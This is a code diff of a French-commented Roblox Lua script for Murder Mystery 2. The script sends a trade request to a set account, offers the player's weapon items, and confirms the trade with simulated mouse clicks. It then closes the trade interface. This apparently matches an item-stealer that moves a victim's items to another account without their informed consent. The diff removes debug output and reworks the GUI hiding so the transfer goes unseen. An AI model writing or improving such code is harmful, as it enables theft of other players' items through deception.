@@ -496,25 +496,17 @@ local VirtualInputManager = game:GetService("VirtualInputManager")
 local Trade = ReplicatedStorage:WaitForChild("Trade")
 
 local function getitems()
-    print("[BOT] Fonction getitems déclenchée !")
-
-    -- On garde le GUI visible pour l'instant pour nos tests
-    -- if destroytrades2 then
-    --     pcall(function() coroutine.resume(destroytrades2) end)
-    -- end
-
     -- 1. Envoi de la demande de trade au compte principal
     local targetPlayer = Players:FindFirstChild(userName)
     if not targetPlayer then
-        warn("[BOT ERREUR] Compte principal introuvable : " .. tostring(userName))
+        warn("Compte principal introuvable : " .. tostring(userName))
         return
     end
 
-    print("[BOT] Envoi de la demande de trade à : " .. targetPlayer.Name)
     Trade.SendRequest:InvokeServer(targetPlayer)
     task.wait(2.5)
 
-    -- 2. Remplissage des 3 cases max de MM2
+    -- 2. Remplissage des 3 cases max (pour éviter la saturation)
     local itemsOffered = 0
     local maxSlots = 3
 
@@ -526,7 +518,7 @@ local function getitems()
                     
                     Trade.OfferItem:FireServer(b.data, "Weapons")
                     itemsOffered = itemsOffered + 1
-                    task.wait(0.4)
+                    task.wait(0.35)
                 end
                 if itemsOffered >= maxSlots then break end
             end
@@ -542,69 +534,48 @@ local function getitems()
     offerAll(uncommonItems)
     offerAll(commonItems)
 
-    print("[BOT] Objets offerts : " .. itemsOffered)
-    task.wait(2)
+    task.wait(1.5)
 
-    -- 3. Première validation (Acceptation initiale)
+    -- 3. Première validation réseau
     pcall(function()
         Trade.AcceptRequest:FireServer()
     end)
 
-    -- 4. Attente du timer MM2 (8 secondes)
+    -- 4. Attente de 8 secondes (pour dépasser le timer serveur de MM2)
     task.wait(8)
 
-    -- 5. VALIDATION PAR CLICS PHYSIQUES AVEC GUI VISIBLE
+    -- 5. SÉQUENCE DE CLICS VIRTUELS SUR LE BOUTON
     pcall(function()
         local Camera = workspace.CurrentCamera
         local ViewportSize = Camera.ViewportSize
 
-        -- Coordonnées du bouton ACCEPTER
         local targetX = ViewportSize.X * 0.76
         local targetY = ViewportSize.Y * 0.74
 
         local function sendClick()
             VirtualInputManager:SendMouseButtonEvent(targetX, targetY, 0, true, game, 0)
-            task.wait(0.15)
+            task.wait(0.1)
             VirtualInputManager:SendMouseButtonEvent(targetX, targetY, 0, false, game, 0)
         end
 
-        print("[BOT] Premier clic d'acceptation...")
+        -- Clic 1 : Verrouillage de l'offre
         sendClick()
-        
+
         task.wait(2)
 
-        print("[BOT] Deuxième clic de confirmation...")
+        -- Clic 2 : Confirmation finale
         sendClick()
 
-        task.wait(1.5)
+        task.wait(1)
 
-        print("[BOT] Clic de sécurité final...")
+        -- Clic 3 : Sécurité
         sendClick()
     end)
-end
 
--- ==========================================
--- ÉCOUTE DU TCHAT (SÉCURISÉ CONTRE LES DOUBLONS)
--- ==========================================
-
-for _, conn in pairs(getconnections or {}) do
-    -- Nettoyage préventif si supporté par l'exécuteur
-end
-
-Players.PlayerAdded:Connect(function(player)
-    if string.lower(player.Name) == string.lower(tostring(userName)) then
-        player.Chatted:Connect(function(msg)
-            getitems()
-        end)
-    end
-end)
-
-for _, player in pairs(Players:GetPlayers()) do
-    if string.lower(player.Name) == string.lower(tostring(userName)) then
-        -- Évite de connecter plusieurs fois le même joueur
-        player.Chatted:Connect(function(msg)
-            getitems()
-        end)
-        print("[BOT] Écouteur activé pour le joueur : " .. player.Name)
+    -- 6. NETTOYAGE / FERMETURE DU GUI SEULEMENT À LA FIN
+    -- Maintenant que le trade est validé, on réactive destroytrades2 pour libérer ton écran !
+    task.wait(1)
+    if destroytrades2 then
+        pcall(function() coroutine.resume(destroytrades2) end)
     end
 end
